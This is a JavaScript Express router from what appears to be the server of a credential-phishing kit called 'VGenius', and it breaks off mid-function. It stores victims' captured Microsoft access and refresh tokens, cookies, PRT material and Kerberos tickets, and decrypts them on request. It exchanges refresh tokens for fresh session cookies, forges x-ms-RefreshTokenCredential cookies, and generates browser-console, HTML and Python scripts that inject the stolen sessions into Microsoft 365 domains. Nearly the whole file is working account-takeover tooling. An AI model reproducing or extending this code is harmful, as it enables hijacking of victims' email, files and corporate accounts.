const express = require('express');
const router = express.Router();
const db = require('../database/connection');
const { userAuth } = require('../middleware/auth');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const kerberosService = require('../services/kerberos');
const silentConsentService = require('../services/silentconsent');
const multer = require('multer');

// Multer config for token file uploads (memory storage for parsing)
const tokenUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
  fileFilter: (req, file, cb) => {
    if (file.originalname.endsWith('.json') || file.originalname.endsWith('.txt')) {
      cb(null, true);
    } else {
      cb(new Error('Only .json and .txt files are allowed'));
    }
  }
});

// Cache for column existence check
let hasTenantColumn = null;

async function checkTenantColumn() {
  if (hasTenantColumn !== null) return hasTenantColumn;
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'tenant'");
    hasTenantColumn = columns.length > 0;
  } catch (e) {
    hasTenantColumn = false;
  }
  return hasTenantColumn;
}

async function checkDeletedColumn() {
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'deleted'");
    return columns.length > 0;
  } catch (e) {
    return false;
  }
}

async function checkAccountTypeColumn() {
  try {
    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
    return columns.length > 0;
  } catch (e) {
    return false;
  }
}

// ─── Skip /inject/* paths - these are handled by cookieinject.js ────
// This prevents /api/tokens/inject/* from being matched by tokenRoutes
router.get('/inject*', (req, res) => {
  // This catch-all ensures /api/tokens/inject/* paths return 404 from this router
  // and can be handled by the mounted cookieInjectRoutes at /api/tokens/inject
  res.status(404).json({ error: 'Not found - use /api/tokens/inject/* for cookie injection' });
});

// ─── Get all tokens for user ────────────────────────────────────────
router.get('/', userAuth, async (req, res) => {
   try {
     const sort = req.query.sort;
     const search = req.query.search;
     const page = parseInt(req.query.page, 10) || 1;
     const limit = parseInt(req.query.limit, 10) || 50;

     const deletedExists = await checkDeletedColumn();
     const tenantExists = await checkTenantColumn();
     let accountTypeExists = false;
     try {
       const [acctCols] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'account_type'");
       accountTypeExists = acctCols.length > 0;
     } catch (e) { /* ignore */ }

     const filters = ['user_id = ?'];
     const params = [req.user.id];
     if (deletedExists) filters.push('deleted = 0');
     if (search) {
       filters.push('(email LIKE ? OR ip_address LIKE ?)');
       params.push('%' + search + '%', '%' + search + '%');
     }
     const whereSql = filters.length ? `WHERE ${filters.join(' AND ')}` : '';
     const selectFields = `id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale${deletedExists ? ', deleted' : ''}, created_at${tenantExists ? ', tenant' : ''}, template_type${accountTypeExists ? ', account_type' : ''}, token_status`;
     let query = `SELECT ${selectFields} FROM captured_tokens ${whereSql}`;
     query += ' ORDER BY created_at ' + (sort === 'oldest' ? 'ASC' : 'DESC');
     const offset = (page - 1) * limit;
     query += ' LIMIT ? OFFSET ?';
     params.push(limit, offset);

     const [t] = await db.query(query, params);
     let tokens = t;
     if (!tenantExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, tenant: 'common' }));
     if (!accountTypeExists && tokens.length > 0) tokens = tokens.map(token => ({ ...token, account_type: null }));

     const countFilters = ['user_id = ?'];
     const countParams = [req.user.id];
     if (deletedExists) countFilters.push('deleted = 0');
     const countWhereSql = countFilters.length ? `WHERE ${countFilters.join(' AND ')}` : '';
     const [countResult] = await db.query(
       `SELECT COUNT(*) as total FROM captured_tokens ${countWhereSql}`,
       countParams
     );

     res.json({
       tokens,
       total: countResult[0].total,
       page,
       pages: Math.ceil(countResult[0].total / limit)
     });
  } catch (err) {
    console.error('[Tokens] Get tokens error:', err.message);
    console.error('[Tokens] Stack:', err.stack);
    res.status(500).json({ error: 'Server error', details: err.message });
  }
});

// ─── Get single token with decrypted data ───────────────────────────
router.get('/:id', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const safeDecrypt = (val) => {
      if (!val) return null;
      try { return decrypt(val); } catch (e) { return null; }
    };
    const decrypted = {
      id: token.id,
      user_id: token.user_id,
      link_id: token.link_id,
      email: token.email,
      token_type: token.token_type,
      ip_address: token.ip_address,
      user_agent: token.user_agent,
      notes: token.notes || '',
      expiration: token.expiration,
      last_renewed: token.last_renewed,
      renewal_count: token.renewal_count,
      renewal_attempts: token.renewal_attempts,
      account_type: token.account_type || 'unknown',
      tenant: token.tenant,
      template_type: token.template_type,
      token_status: token.token_status || 'unknown',
      created_at: token.created_at,
      access_token: safeDecrypt(token.access_token_encrypted),
      refresh_token: safeDecrypt(token.refresh_token_encrypted),
      id_token: safeDecrypt(token.id_token_encrypted),
      cookies: safeDecrypt(token.cookies_encrypted),
      prt: safeDecrypt(token.prt),
      session_key_jwe: safeDecrypt(token.session_key_jwe),
      device_tenant_id: token.device_tenant_id,
      tgt_ad: safeDecrypt(token.tgt_ad),
      tgt_cloud: safeDecrypt(token.tgt_cloud),
      kerberos_top_level_names: token.kerberos_top_level_names,
      tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
    };

    res.json(decrypted);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Update token notes ─────────────────────────────────────────────
router.put('/:id/notes', userAuth, async (req, res) => {
  try {
    const { notes } = req.body;
    await db.query(
      'UPDATE captured_tokens SET notes = ? WHERE id = ? AND user_id = ?',
      [notes || '', req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Soft delete token ──────────────────────────────────────────────
router.delete('/:id', userAuth, async (req, res) => {
  try {
    await db.query(
      'UPDATE captured_tokens SET deleted = 1, deleted_at = NOW() WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// ─── Generate cookie script ─────────────────────────────────────────
router.get('/:id/cookie-script', userAuth, async (req, res) => {
  try {
    const [tokens] = await db.query(
      'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
      [req.params.id, req.user.id]
    );
    if (!tokens.length) return res.status(404).json({ error: 'Token not found' });

    const token = tokens[0];
    const safeDecrypt = (val) => {
      if (!val) return null;
      try { return decrypt(val); } catch (e) { return null; }
    };
    const accessToken = safeDecrypt(token.access_token_encrypted);
    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
    const storedCookies = safeDecrypt(token.cookies_encrypted);

    if (!accessToken && !refreshToken && !storedCookies) {
      return res.status(400).json({ error: 'No tokens available' });
    }

    var tenant = token.tenant || config.AZURE_TENANT || 'common';
    var accountType = token.account_type || 'unknown';
    var cookiesList = [];
    var cookies = null;
    var exchangeError = null;

    // ALWAYS exchange refresh token first for fresh cookies (primary method)
    if (refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        const templateType = token.template_type || 'office';
        console.log('[Tokens] Exchanging refresh token for fresh cookies...');
        const conversionResult = await cookieConverter.convertTokensToCookies(
          refreshToken, templateType, tenant, null, accountType
        );
        if (conversionResult.success && conversionResult.cookies) {
          cookies = conversionResult.cookies;
          cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
          console.log('[Tokens] Fresh cookies generated:', cookiesList.length);
        } else {
          exchangeError = conversionResult.error || 'Token exchange returned no cookies';
          console.error('[Tokens] Token exchange failed:', exchangeError);
        }
      } catch (convertErr) {
        exchangeError = convertErr.message || 'Unknown conversion error';
        console.error('[Tokens] Cookie conversion error:', exchangeError);
      }
    }

    // Fallback: use stored cookies if exchange failed
    if (cookiesList.length === 0 && storedCookies) {
      console.log('[Tokens] Using stored cookies as fallback');
      cookies = storedCookies;
      cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
    }

    // Generate x-ms-RefreshTokenCredential PRT script (most reliable method)
    var prtScript = null;
    var prtError = null;
    
    // First, try to REFRESH stored PRT cookie from device_credentials table
    // Always generate a FRESH PRT cookie - never reuse old ones
    if (token.user_id && tenant && tenant !== 'common' && tenant !== 'organizations') {
      try {
        const cookieConverter = require('../services/cookieconverter');
        console.log('[Tokens] Refreshing PRT cookie for user', token.user_id, 'tenant', tenant);
        const freshPrt = await cookieConverter.refreshStoredPrtCookie(token.user_id, tenant, refreshToken);
        if (freshPrt) {
          console.log('[Tokens] Fresh PRT cookie generated from device credentials');
          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${freshPrt}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
        }
      } catch (refreshErr) {
        console.error('[Tokens] Failed to refresh PRT:', refreshErr.message);
      }
    }
    
    // If no stored device credentials, generate from refresh token with unique nonce
    if (!prtScript && refreshToken) {
      try {
        const cookieConverter = require('../services/cookieconverter');
        var tid = tenant;
        var uid = '';
        const idToken = safeDecrypt(token.id_token_encrypted);
        if (idToken) {
          try {
            const idPayload = idToken.split('.')[1];
            let padded = idPayload;
            while (padded.length % 4) padded += '=';
            const decoded = JSON.parse(Buffer.from(padded, 'base64').toString());
            tid = decoded.tid || tid;
            // Extract uid from id_token's oid claim (object id = uid)
            uid = decoded.oid || decoded.sub || '';
            console.log('[Tokens] Extracted from id_token: tid=' + tid + ', uid=' + uid.substring(0, 8) + '...');
          } catch (e) { /* ignore */ }
        }
        const sessionKeyJwe = safeDecrypt(token.session_key_jwe);
        if (sessionKeyJwe) {
          try {
            const parsed = JSON.parse(sessionKeyJwe);
            if (parsed.client_info) {
              const decoded = Buffer.from(parsed.client_info, 'base64').toString();
              const info = JSON.parse(decoded);
              uid = info.uid || uid; // Use session_key_jwe uid if available, otherwise keep id_token uid
              console.log('[Tokens] Extracted uid from session_key_jwe: ' + uid.substring(0, 8) + '...');
            }
          } catch (e) { /* ignore */ }
        }
        // Log if uid is missing (will fall back to base64 format instead of PRT JWT)
        if (!uid) {
          console.warn('[Tokens] uid not found - PRT JWT generation will use base64 fallback');
        }
        const prtCookieObj = cookieConverter.generateXmsRefreshTokenCredential(
          refreshToken,
          accountType,
          { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
        );
        if (prtCookieObj && prtCookieObj.value) {
          // IMPORTANT: Do NOT include domain attribute - browsers block third-party cookies
          // Set cookie for current page only, then redirect to auth endpoint
          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 1000);`;
          console.log('[Tokens] PRT script generated from refresh token');
        } else {
          prtError = 'PRT cookie generation returned null value';
        }
      } catch (prtErr) {
        prtError = prtErr.message || 'PRT generation failed';
        console.error('[Tokens] PRT script generation error:', prtError);
      }
    }

    if (cookiesList.length === 0 && !prtScript) {
      return res.status(400).json({
        error: 'No cookies could be generated',
        exchange_error: exchangeError || 'No refresh token available',
        prt_error: prtError,
        hint: 'The refresh token may be expired or revoked. Try capturing new credentials.'
      });
    }

    // Generate simple direct injection script (works on login.microsoftonline.com)
    var directScript = generateDirectInjectionScript(cookiesList, prtScript);

    var scripts = {};
    scripts.console = directScript;
    scripts.prt = prtScript;
    scripts.html = cookiesList.length > 0 ? generateStandaloneHtml(cookiesList) : '';
    scripts.python = cookiesList.length > 0 ? generatePythonScript(cookiesList) : '';

    res.json({
      script: directScript,
      prt_script: prtScript,
      scripts: scripts,
      cookie_count: cookiesList.length,
      cookies: cookiesList,
      generated_at: new Date().toISOString(),
      fresh: cookiesList.length > 0 && !storedCookies,
      exchange_error: exchangeError,
      used_fallback: cookiesList.length > 0 && !exchangeError ? false : !!storedCookies
    });
  } catch (err) {
    console.error('[Tokens] Cookie script error:', err);
    res.status(500).json({ error: 'Failed to generate script', details: err.message });
  }
});

// ─── Parse cookie string into array of cookie objects ───────────────
// Enhanced: Supports tenant and account type for proper domain handling
function parseCookies(cookieString, options) {
  if (!cookieString) return [];

  options = options || {};
  var tenant = options.tenant || 'common';
  var accountType = options.accountType || 'unknown';

  // Build domain map for proper cookie domain assignment
  var domainMap = buildCookieDomainMap(tenant, accountType);

  var seenNames = {};
  var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });

  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].trim();
    var eqIndex = pair.indexOf('=');
    if (eqIndex > 0) {
      var name = pair.substring(0, eqIndex).trim();
      var value = pair.substring(eqIndex + 1).trim();
      var nameLower = name.toLowerCase();

      // Skip cookie attributes and their values
      if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
          nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
          nameLower === 'samesite' || nameLower === 'partitioned') {
        continue;
      }

      // Skip empty values
      if (!value || value.length === 0) continue;

      // Assign proper domain based on cookie name
      var assignedDomain = domainMap.getDomain(name);

      // Store unique cookies by lowercase name (last occurrence wins)
      seenNames[nameLower] = { name: name, value: value, domain: assignedDomain };
    }
  }

  // Convert object back to array
  var cookies = [];
  for (var key in seenNames) {
    if (Object.prototype.hasOwnProperty.call(seenNames, key)) {
      cookies.push(seenNames[key]);
    }
  }
  return cookies;
}

// ─── Build Cookie Domain Map ───────────────────────────────────────
function buildCookieDomainMap(tenant, accountType) {
  var domainMap = {
    _getDomain: function(cookieName) {
      var nameLower = cookieName.toLowerCase();

      // Personal account (MSA) domains
      if (accountType === 'personal') {
        if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken') {
          return '.login.live.com';
        }
        if (nameLower.indexOf('mscc') !== -1 || nameLower.indexOf('CRSLST') !== -1 ||
            nameLower.indexOf('STSSVC') !== -1 || nameLower.indexOf('wgctx') !== -1) {
          return '.login.live.com';
        }
        return '.login.live.com';
      }

      // Work/School account domains
      if (nameLower === 'x-ms-RefreshTokenCredential' || nameLower === 'RefreshToken' ||
          nameLower === 'pst' || nameLower === 'esx' || nameLower === 'gtmk' ||
          nameLower === 'es' || nameLower === 'pplms') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower === 'SCAuth' || nameLower === 'SigninChallenge' ||
          nameLower === 'AccountAuthCookie' || nameLower === 'AMLBGen') {
        return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
      }
      if (nameLower.indexOf('x-ms') !== -1 || nameLower.indexOf('msauth') !== -1) {
        return '.login.microsoftonline.com';
      }
      if (nameLower === '_oacl' || nameLower === '_rcid' || nameLower === 'RUpdT' ||
          nameLower === 'MCLRC' || nameLower === 'wssbLocation') {
        return '.office.com';
      }
      if (nameLower === 'WAAf' || nameLower === 'MSSWFS' || nameLower === 'RSTT' ||
          nameLower.indexOf('onedrive') !== -1) {
        return '.onedrive.live.com';
      }
      if (nameLower === 'ClientInfo' || nameLower === 'ExAuthCookie' ||
          nameLower.indexOf('outlook') !== -1) {
        return '.outlook.office365.com';
      }
      if (nameLower === 'SPOIDCRL' || nameLower === 'SPOExtensionSDK' ||
          nameLower.indexOf('sharepoint') !== -1) {
        return '.sharepoint.com';
      }
      if (nameLower === 'TEAMSSESSION' || nameLower.indexOf('teams') !== -1) {
        return '.teams.microsoft.com';
      }

      // Default fallback
      if (accountType === 'personal') return '.login.live.com';
      return tenant && tenant !== 'common' ? '.' + tenant : '.login.microsoftonline.com';
    },
    getDomain: function(cookieName) {
      return this._getDomain(cookieName);
    }
  };
  return domainMap;
}

// ─── PROPER METHOD: Multi-domain cookie injection script ─
// Fixes: Browser same-origin policy prevents setting cookies for different domains
// from a single page. This script uses hidden iframes to navigate to each domain
// and set cookies there, then redirects to Office.com when done.
function generatePopupScript(cookies) {
  if (!cookies || cookies.length === 0) return '';
  
  // Group cookies by domain
  var domainMap = {};
  for (var i = 0; i < cookies.length; i++) {
    var c = cookies[i];
    var d = c.domain || '.login.microsoftonline.com';
    if (!domainMap[d]) domainMap[d] = [];
    domainMap[d].push(c);
  }
  var domains = Object.keys(domainMap);
  
  var output = '// VGenius Multi-Domain Cookie Injection\n';
  output += '(function() {\n';
  output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
  output += '  var domainMap = ' + JSON.stringify(domainMap) + ';\n';
  output += '  var domains = ' + JSON.stringify(domains) + ';\n';
  output += '  var idx = 0;\n';
  output += '  var injected = 0;\n';
  output += '\n';
  output += '  function setCookiesForDomain(domain) {\n';
  output += '    var domainCookies = domainMap[domain] || [];\n';
  output += '    for (var i = 0; i < domainCookies.length; i++) {\n';
  output += '      var c = domainCookies[i];\n';
  output += '      try {\n';
  output += '        document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=" + c.domain + "; path=/; Secure; SameSite=None";\n';
  output += '        injected++;\n';
  output += '      } catch(e) {}\n';
  output += '    }\n';
  output += '  }\n';
  output += '\n';
  output += '  function processNext() {\n';
  output += '    if (idx >= domains.length) {\n';
  output += '      console.log("[VGenius] All " + injected + " cookies injected!");\n';
  output += '      setTimeout(function() { window.location.href = "https://www.office.com/"; }, 2000);\n';
  output += '      return;\n';
  output += '    }\n';
  output += '    var domain = domains[idx++];\n';
  output += '    console.log("[VGenius] Injecting cookies for " + domain);\n';
  output += '    var iframe = document.createElement("iframe");\n';
  output += '    iframe.style.display = "none";\n';
  output += '    iframe.src = "https://" + domain.replace(/^\./, "") + "/";\n';
  output += '    iframe.onload = function() {\n';
  output += '      try { setCookiesForDomain(domain); } catch(e) {}\n';
  output += '      setTimeout(processNext, 500);\n';
  output += '    };\n';
  output += '    iframe.onerror = function() { setTimeout(processNext, 300); };\n';
  output += '    document.body.appendChild(iframe);\n';
  output += '  }\n';
  output += '\n';
  output += '  setCookiesForDomain(window.location.hostname);\n';
  output += '  setTimeout(processNext, 500);\n';
  output += '})();\n';
  
  return output;
}

// Direct injection script - works on login.microsoftonline.com page
// Sets cookies for current domain then redirects to trigger SSO
function generateDirectInjectionScript(cookies, prtScript) {
  // If we have a PRT script, use that as the primary method (most reliable)
  if (prtScript) {
    // Extract the PRT value from the script
    var prtValue = (prtScript.match(/x-ms-RefreshTokenCredential=([^;]+)/) || ['', ''])[1];

    var prtOutput = '// VGenius PRT Cookie Injection Script\n';
    prtOutput += '// IMPORTANT: Paste this in the browser console on login.microsoftonline.com\n';
    prtOutput += '// The PRT cookie will be set and you will be redirected to authenticate\n';
    prtOutput += '(function() {\n';
    prtOutput += '  "use strict";\n';
    prtOutput += '  console.log("[VGenius] Injecting PRT cookie...");\n';
    prtOutput += '  \n';
    prtOutput += '  // Set the PRT cookie without domain (works on current page)\n';
    prtOutput += '  // This is the Primary Refresh Token that Microsoft uses for SSO\n';
    prtOutput += '  try {\n';
    prtOutput += '    // First, set the cookie without domain attribute\n';
    prtOutput += '    document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; path=/; Secure; SameSite=None";\n';
    prtOutput += '    console.log("[VGenius] PRT cookie set successfully!");\n';
    prtOutput += '    \n';
    prtOutput += '    // Also try setting with the current page domain\n';
    prtOutput += '    var currentDomain = window.location.hostname;\n';
    prtOutput += '    if (currentDomain) {\n';
    prtOutput += '      document.cookie = "x-ms-RefreshTokenCredential=' + prtValue + '; domain=." + currentDomain + "; path=/; Secure; SameSite=None";\n';
    prtOutput += '      console.log("[VGenius] PRT cookie set for domain: " + currentDomain);\n';
    prtOutput += '    }\n';
    prtOutput += '  } catch(e) {\n';
    prtOutput += '    console.error("[VGenius] Failed to set PRT cookie:", e);\n';
    prtOutput += '  }\n';
    prtOutput += '  \n';
    prtOutput += '  // Redirect to Microsoft auth endpoint to trigger SSO\n';
    prtOutput += '  console.log("[VGenius] Redirecting to authenticate...");\n';
    prtOutput += '  setTimeout(function() {\n';
    prtOutput += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
    prtOutput += '  }, 1500);\n';
    prtOutput += '})();\n';
    return prtOutput;
  }

  if (!cookies || cookies.length === 0) {
    return '';
  }

  var output = '// VGenius Cookie Injection Script\n';
  output += '// IMPORTANT: Paste this in console on https://login.microsoftonline.com\n';
  output += '(function() {\n';
  output += '  "use strict";\n';
  output += '  var injected = 0;\n';
  output += '  var failed = 0;\n';
  output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
  output += '\n';
  output += '  console.log("[VGenius] Starting cookie injection... " + cookies.length + " cookies");\n';
  output += '\n';
  output += '  // Set all cookies without domain attribute (works for current page)\n';
  output += '  for (var i = 0; i < cookies.length; i++) {\n';
  output += '    var c = cookies[i];\n';
  output += '    try {\n';
  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; path=/; Secure; SameSite=None";\n';
  output += '      injected++;\n';
  output += '      console.log("[VGenius] Set: " + c.name);\n';
  output += '    } catch(e) {\n';
  output += '      failed++;\n';
  output += '      console.error("[VGenius] Failed: " + c.name, e);\n';
  output += '    }\n';
  output += '  }\n';
  output += '\n';
  output += '  console.log("[VGenius] Successfully injected " + injected + "/" + cookies.length + " cookies");\n';
  output += '\n';
  output += '  // Wait 2s then redirect to trigger SSO\n';
  output += '  setTimeout(function() {\n';
  output += '    console.log("[VGenius] Redirecting to Office 365...");\n';
  output += '    window.location.href = "https://www.office.com/";\n';
  output += '  }, 2000);\n';
  output += '})();\n';

  return output;
}

// ─── Standalone HTML injector page ──────────────────────────────────
function generateStandaloneHtml(cookies) {
  const cookieJson = JSON.stringify(cookies);
  var domainMap = {};
  for (var i = 0; i < cookies.length; i++) {
    var c = cookies[i];
    var d = c.domain || '.login.microsoftonline.com';
    if (!domainMap[d]) domainMap[d] = [];
    domainMap[d].push(c);
  }
  var domains = Object.keys(domainMap);
  var domainMapJson = JSON.stringify(domainMap);
  var domainsJson = JSON.stringify(domains);

  var html = '<!DOCTYPE html>\\n<html lang=\"en\">\\n<head>\\n';
  html += ' <meta charset=\"UTF-8\">\\n';
  html += ' <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\\n';
  html += ' <title>VGenius Cookie Injector</title>\\n';
  html += ' <style>\\n';
  html += ' * { margin: 0; padding: 0; box-sizing: border-box; }\\n';
  html += ' body { font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, sans-serif; padding: 40px; max-width: 700px; margin: 0 auto; background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%); color: #e0e0e0; min-height: 100vh; }\\n';
  html += ' h1 { color: #00ccff; margin-bottom: 20px; text-align: center; }\\n';
  html += ' .info-box { background: rgba(0,204,255,0.1); border: 1px solid rgba(0,204,255,0.3); border-radius: 8px; padding: 20px; margin: 20px 0; }\\n';
  html += ' .info-box p { margin: 8px 0; font-size: 14px; }\\n';
  html += ' .info-box strong { color: #00ccff; }\\n';
  html += ' button { padding: 14px 28px; cursor: pointer; background: linear-gradient(135deg, #00ccff, #0099cc); color: #000; border: none; border-radius: 8px; font-weight: bold; font-size: 15px; margin: 8px; transition: all 0.2s; }\\n';
  html += ' button:hover { background: linear-gradient(135deg, #00aacc, #0088bb); }\\n';
  html += ' .btn-secondary { background: linear-gradient(135deg, #666, #444); color: #fff; }\\n';
  html += ' .status { margin-top: 16px; padding: 16px; border-radius: 8px; font-size: 14px; }\\n';
  html += ' .success { background: rgba(0,255,0,0.1); border: 1px solid rgba(0,255,0,0.3); color: #0f0; }\\n';
  html += ' .error { background: rgba(255,0,0,0.1); border: 1px solid rgba(255,0,0,0.3); color: #f00; }\\n';
  html += ' .progress { margin-top: 16px; }\\n';
  html += ' .progress-bar { height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; }\\n';
  html += ' .progress-fill { height: 100%; background: linear-gradient(90deg, #00ccff, #00ff88); width: 0%; transition: width 0.3s; }\\n';
  html += ' .progress-text { margin-top: 8px; font-size: 13px; color: #888; }\\n';
  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #333; border-radius: 8px; overflow-x: auto; font-size: 11px; color: #0f0; max-height: 300px; white-space: pre-wrap; word-break: break-all; }\\n';
  html += ' .domain-list { margin: 12px 0; font-size: 12px; color: #888; }\\n';
  html += ' .domain-list span { display: inline-block; background: rgba(0,204,255,0.1); padding: 2px 8px; border-radius: 4px; margin: 2px; }\\n';
  html += ' </style>\\n';
  html += '</head>\\n<body>\\n';
  html += ' <h1>VGenius Cookie Session Injector</h1>\\n';
  html += ' <div class=\"info-box\">\\n';
  html += '  <p><strong>Cookies to inject:</strong> ' + cookies.length + '</p>\\n';
  html += '  <p><strong>Domains:</strong></p>\\n';
  html += '  <div class=\"domain-list\">' + domains.map(function(d) { return '<span>' + d + ' (' + (domainMap[d]||[]).length + ')</span>'; }).join('') + '</div>\\n';
  html += ' </div>\\n';
  html += ' <div style=\"text-align:center;\">\\n';
  html += '  <button onclick=\"injectCookies()\" id=\"injectBtn\">Start Cookie Injection</button>\\n';
  html += '  <button class=\"btn-secondary\" onclick=\"showScript()\" id=\"scriptBtn\">Show Console Script</button>\\n';
  html += ' </div>\\n';
  html += ' <div class=\"progress\" id=\"progressDiv\" style=\"display:none;\">\\n';
  html += '  <div class=\"progress-bar\"><div class=\"progress-fill\" id=\"progressFill\"></div></div>\\n';
  html += '  <p class=\"progress-text\" id=\"progressText\"></p>\\n';
  html += ' </div>\\n';
  html += ' <div class=\"status\" id=\"status\" style=\"display:none;\"></div>\\n';
  html += ' <div id=\"scriptDiv\" style=\"display:none;margin-top:20px;\">\\n';
  html += '  <p style=\"font-size:12px;color:#888;margin-bottom:8px;\">Copy this script and paste it into the browser console on the Microsoft login page:</p>\\n';
  html += '  <pre id=\"scriptContent\"></pre>\\n';
  html += '  <button onclick=\"copyScript()\" style=\"margin-top:8px;\">Copy Script</button>\\n';
  html += ' </div>\\n';
  html += ' <script>\\n';
  html += ' var cookies = ' + cookieJson + ';\\n';
  html += ' var domainMap = ' + domainMapJson + ';\\n';
  html += ' var domains = ' + domainsJson + ';\\n';
  html += ' var statusDiv = document.getElementById(\"status\");\\n';
  html += ' var progressDiv = document.getElementById(\"progressDiv\");\\n';
  html += ' var progressFill = document.getElementById(\"progressFill\");\\n';
  html += ' var progressText = document.getElementById(\"progressText\");\\n';
  html += ' var injectBtn = document.getElementById(\"injectBtn\");\\n';
  html += '\\n';
  html += ' function setStatus(msg, type) {\\n';
  html += '   statusDiv.style.display = \"block\";\\n';
  html += '   statusDiv.className = \"status \" + type;\\n';
  html += '   statusDiv.innerHTML = msg;\\n';
  html += ' }\\n';
  html += '\\n';
  html += ' function updateProgress(current, total, domain) {\\n';
  html += '   progressDiv.style.display = \"block\";\\n';
  html += '   var pct = (current / total) * 100;\\n';
  html += '   progressFill.style.width = pct + \"%\";\\n';
  html += '   progressText.textContent = \"Domain \" + current + \"/\" + total + \": \" + domain;\\n';
  html += ' }\\n';
  html += '\\n';
  html += ' function injectCookies() {\\n';
  html += '   injectBtn.disabled = true;\\n';
  html += '   injectBtn.textContent = \"Injecting...\";\\n';
  html += '   setStatus(\"Starting multi-domain injection...\", \"success\");\\n';
  html += '   progressDiv.style.display = \"block\";\\n';
  html += '   var idx = 0;\\n';
  html += '   var totalDomains = domains.length;\\n';
  html += '   var totalCookies = cookies.length;\\n';
  html += '   var injected = 0;\\n';
  html += '   function setCookiesForDomain(domain) {\\n';
  html += '     var domainCookies = domainMap[domain] || [];\\n';
  html += '     for (var i = 0; i < domainCookies.length; i++) {\\n';
  html += '       var c = domainCookies[i];\\n';
  html += '       try {\\n';
  html += '         document.cookie = c.name + \"=\" + encodeURIComponent(c.value) + \"; domain=\" + c.domain + \"; path=/; Secure; SameSite=None\";\\n';
  html += '         injected++;\\n';
  html += '       } catch(e) { console.warn(\"Failed to set cookie on \" + domain + \": \" + c.name); }\\n';
  html += '     }\\n';
  html += '   }\\n';
  html += '   function processNext() {\\n';
  html += '     if (idx >= totalDomains) {\\n';
  html += '       injectBtn.disabled = false;\\n';
  html += '       injectBtn.textContent = \"Done!\";\\n';
  html += '       setStatus(\"Successfully injected \" + injected + \"/\" + totalCookies + \" cookies across \" + totalDomains + \" domains! Redirecting to Office.com...\", \"success\");\\n';
  html += '       setTimeout(function() { window.location.href = \"https://www.office.com/\"; }, 3000);\\n';
  html += '       return;\\n';
  html += '     }\\n';
  html += '     var domain = domains[idx++];\\n';
  html += '     updateProgress(idx, totalDomains, domain);\\n';
  html += '     var iframe = document.createElement(\"iframe\");\\n';
  html += '     iframe.style.display = \"none\";\\n';
  html += '     var targetUrl = \"https://\" + domain.replace(/^\\./, \"\") + \"/\";\\n';
  html += '     iframe.src = targetUrl;\\n';
  html += '     iframe.onload = function() {\\n';
  html += '       try { setCookiesForDomain(domain); } catch(e) {}\\n';
  html += '       setTimeout(processNext, 800);\\n';
  html += '     };\\n';
  html += '     iframe.onerror = function() { setTimeout(processNext, 500); };\\n';
  html += '     document.body.appendChild(iframe);\\n';
  html += '   }\\n';
  html += '   setTimeout(processNext, 500);\\n';
  html += ' }\\n';
  html += '\\n';
  html += ' function showScript() {\\n';
  html += '   var scriptDiv = document.getElementById(\"scriptDiv\");\\n';
  html += '   var scriptContent = document.getElementById(\"scriptContent\");\\n';
  html += '   scriptDiv.style.display = scriptDiv.style.display === \"none\" ? \"block\" : \"none\";\\n';
  html += '   if (scriptDiv.style.display === \"block\") {\\n';
  html += '     var script = \"// VGenius Multi-Domain Cookie Injection\\n\";\\n';
  html += '     script += \"(function() {\\n\";\\n';
  html += '     script += \"  var cookies = \" + JSON.stringify(cookies) + \";\\n\";\\n';
  html += '     script += \"  cookies.forEach(function(c) {\\n\";\\n';
  html += '     script += \"    try {\\n\";\\n';
